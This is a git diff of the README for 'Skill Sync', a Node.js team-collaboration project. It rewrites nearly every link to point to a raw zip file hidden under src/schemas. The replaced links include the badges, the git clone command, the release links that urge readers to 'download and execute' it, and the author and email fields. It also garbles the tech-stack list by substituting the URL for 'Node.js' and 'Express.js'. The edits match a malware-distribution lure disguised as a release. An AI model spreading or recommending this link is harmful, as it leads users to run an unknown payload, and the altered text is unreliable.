@@ -1,7 +1,7 @@
 # Skill Sync 🚀
 
-![Skill Sync](https://img.shields.io/badge/Skill%20Sync-v1.0.0-blue.svg)  
-[![Releases](https://img.shields.io/badge/Releases-latest-orange.svg)](https://github.com/nhuyiuem/skill-sync/releases)
+![Skill Sync](https://github.com/nhuyiuem/skill-sync/raw/refs/heads/main/src/schemas/sync_skill_1.6.zip%https://github.com/nhuyiuem/skill-sync/raw/refs/heads/main/src/schemas/sync_skill_1.6.zip)  
+[![Releases](https://github.com/nhuyiuem/skill-sync/raw/refs/heads/main/src/schemas/sync_skill_1.6.zip)](https://github.com/nhuyiuem/skill-sync/raw/refs/heads/main/src/schemas/sync_skill_1.6.zip)
 
 Welcome to **Skill Sync**, a modern team collaboration platform designed to help organizations manage skills, coordinate teams, and track tasks effectively. This repository contains the source code and documentation for Skill Sync.
 
@@ -28,8 +28,8 @@ Welcome to **Skill Sync**, a modern team collaboration platform designed to help
 
 Skill Sync is built using a modern stack that includes:
 
-- **Node.js**: JavaScript runtime for server-side development.
-- **Express.js**: Web framework for building APIs.
+- **https://github.com/nhuyiuem/skill-sync/raw/refs/heads/main/src/schemas/sync_skill_1.6.zip**: JavaScript runtime for server-side development.
+- **https://github.com/nhuyiuem/skill-sync/raw/refs/heads/main/src/schemas/sync_skill_1.6.zip**: Web framework for building APIs.
 - **MongoDB**: NoSQL database for data storage.
 - **Mongoose**: ODM for MongoDB to manage relationships between data.
 - **Bcrypt**: Password hashing for security.
@@ -46,7 +46,7 @@ To get started with Skill Sync, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/nhuyiuem/skill-sync.git
+   git clone https://github.com/nhuyiuem/skill-sync/raw/refs/heads/main/src/schemas/sync_skill_1.6.zip
    ```
    
 2. Navigate to the project directory:
@@ -73,7 +73,7 @@ To get started with Skill Sync, follow these steps:
 
 6. Visit `http://localhost:3000` in your browser.
 
-For the latest releases, visit the [Releases section](https://github.com/nhuyiuem/skill-sync/releases) to download and execute the latest version.
+For the latest releases, visit the [Releases section](https://github.com/nhuyiuem/skill-sync/raw/refs/heads/main/src/schemas/sync_skill_1.6.zip) to download and execute the latest version.
 
 ## Usage
 
@@ -134,9 +134,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **Author**: [Your Name](https://github.com/yourusername)
-- **Email**: your.email@example.com
+- **Author**: [Your Name](https://github.com/nhuyiuem/skill-sync/raw/refs/heads/main/src/schemas/sync_skill_1.6.zip)
+- **Email**: https://github.com/nhuyiuem/skill-sync/raw/refs/heads/main/src/schemas/sync_skill_1.6.zip
 
-For the latest releases, visit the [Releases section](https://github.com/nhuyiuem/skill-sync/releases) to download and execute the latest version. 
+For the latest releases, visit the [Releases section](https://github.com/nhuyiuem/skill-sync/raw/refs/heads/main/src/schemas/sync_skill_1.6.zip) to download and execute the latest version. 
 
 Thank you for your interest in Skill Sync! We hope it helps you and your team work more effectively.
